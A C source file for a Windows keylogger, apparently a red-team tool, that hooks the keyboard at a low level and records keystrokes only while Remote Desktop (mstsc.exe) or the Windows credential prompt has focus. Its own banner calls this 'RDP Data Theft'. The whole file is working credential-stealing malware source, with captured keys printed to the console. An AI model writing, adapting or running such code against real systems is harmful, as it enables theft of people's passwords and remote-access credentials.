#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>


DWORD GetProcId(const wchar_t* procName) {
    DWORD procId = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnap, &pe32)) {
            do {
                if (!_wcsicmp(procName, pe32.szExeFile)) {
                    procId = pe32.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &pe32));
        }
    }
    CloseHandle(hSnap);
    return procId;
}


BOOL isWindowOfProcessFocused(const wchar_t* processName) {
    // Get the PID of the process
    DWORD pid = GetProcId(processName);
    if (pid == 0) {
        // Process not found
        return FALSE;
    }

    // Get handle to the active window
    HWND hActiveWindow = GetForegroundWindow();
    if (hActiveWindow == NULL) {
        // No active window found
        return FALSE;
    }

    // Get PID of the active window
    DWORD activePid;
    GetWindowThreadProcessId(hActiveWindow, &activePid);

    // Check if the active window belongs to the process we're interested in
    if (activePid != pid) {
        // Active window does not belong to the specified process
        return FALSE;
    }

    // If we've gotten this far, the active window belongs to our process
    return TRUE;
}


LRESULT CALLBACK KbdHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {

        if (isWindowOfProcessFocused(L"mstsc.exe") || isWindowOfProcessFocused(L"CredentialUIBroker.exe")) {

            static int prev;
            BOOL isLetter = 1;

            if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
                PKBDLLHOOKSTRUCT kbdStruct = (PKBDLLHOOKSTRUCT)lParam;
                int vkCode = kbdStruct->vkCode;

                if (vkCode == 0xA2) { // LCTRL or initial signal of RALT
                    prev = vkCode;
                    return CallNextHookEx(NULL, nCode, wParam, lParam);
                }

                if (prev == 0xA2 && vkCode == 0xA5) { // RALT
                    printf("<RALT>");
                    isLetter = 0;
                }
                else if (prev == 0xA2 && vkCode != 0xA5) {
                    printf("<LCTRL>");
                }

                BOOL shiftPressed = (GetKeyState(VK_SHIFT) & 0x8000) != 0;

                switch (vkCode) {
                case 0xA3: printf("<RCTRL>"); isLetter = 0; break;
                case 0xA4: printf("<LALT>"); isLetter = 0; break;
                case VK_CAPITAL: printf("<CAPSLOCK>"); isLetter = 0; break;
                case 0x08: printf("<ESC>"); isLetter = 0; break;
                case 0x0D: putchar('\n'); isLetter = 0; break;
                case VK_OEM_PLUS: shiftPressed ? printf("+") : printf("="); isLetter = 0; break;
                case VK_OEM_COMMA: shiftPressed ? printf("<") : printf(","); isLetter = 0; break;
                case VK_OEM_MINUS: shiftPressed ? printf("_") : printf("-"); isLetter = 0; break;
                case VK_OEM_PERIOD: shiftPressed ? printf(">") : printf("."); isLetter = 0; break;
                case VK_OEM_1: shiftPressed ? printf(":") : printf(";"); isLetter = 0; break;
                case VK_OEM_2: shiftPressed ? printf("?") : printf("/"); isLetter = 0; break;
                case VK_OEM_3: shiftPressed ? printf("~") : printf("`"); isLetter = 0; break;
                case VK_OEM_4: shiftPressed ? printf("{") : printf("["); isLetter = 0; break;
                case VK_OEM_5: shiftPressed ? printf("|") : printf("\\"); isLetter = 0; break;
                case VK_OEM_6: shiftPressed ? printf("}") : printf("]"); isLetter = 0; break;
                case VK_OEM_7: shiftPressed ? printf("\"") : printf("'"); isLetter = 0; break;
                default: break;
                }

                prev = vkCode;
                if (isLetter) {
                    BOOL capsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
                    if (vkCode >= 0x41 && vkCode <= 0x5A) {
                        if (capsLock ^ shiftPressed) { // XOR operation, to check if exactly one of them is TRUE
                            printf("%c", vkCode);
                        }
                        else {
                            printf("%c", vkCode + 0x20); // Convert to lowercase
                        }
                    }
                    else if (vkCode >= 0x61 && vkCode <= 0x7A) {
                        if (capsLock ^ shiftPressed) {
                            printf("%c", vkCode - 0x20); // Convert to uppercase
                        }
                        else {
                            printf("%c", vkCode);
                        }
                    }
                    else if (vkCode >= 0x30 && vkCode <= 0x39) { // Check if key is a number key
                        if (shiftPressed) {
                            switch (vkCode) {
                            case '1': printf("!"); break;
                            case '2': printf("@"); break;
                            case '3': printf("#"); break;
                            case '4': printf("$"); break;
                            case '5': printf("%"); break;
                            case '6': printf("^"); break;
                            case '7': printf("&"); break;
                            case '8': printf("*"); break;
                            case '9': printf("("); break;
                            case '0': printf(")"); break;
                            default: break;
                            }
                        }
                        else {
                            printf("%c", vkCode);
                        }
                    }
                }
            }


        }
        else
        {
            // When the active window is not related to the specified processes, don't log.
            return CallNextHookEx(NULL, nCode, wParam, lParam);
        }


    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);

}

int main(void) {
    
    printf("\n\n[+] Starting RDP Data Theft\n");
    printf("[+] Waiting for RDP related processes\n\n");
    HHOOK kbdHook = SetWindowsHookEx(WH_KEYBOARD_LL, KbdHookProc, 0, 0);

    while (true) {
          
            MSG msg;

            while (!GetMessage(&msg, NULL, 0, 0)) {
                TranslateMessage(&msg);
                DispatchMessage(&msg);
            }
    }

    UnhookWindowsHookEx(kbdHook);

    return 0;
}
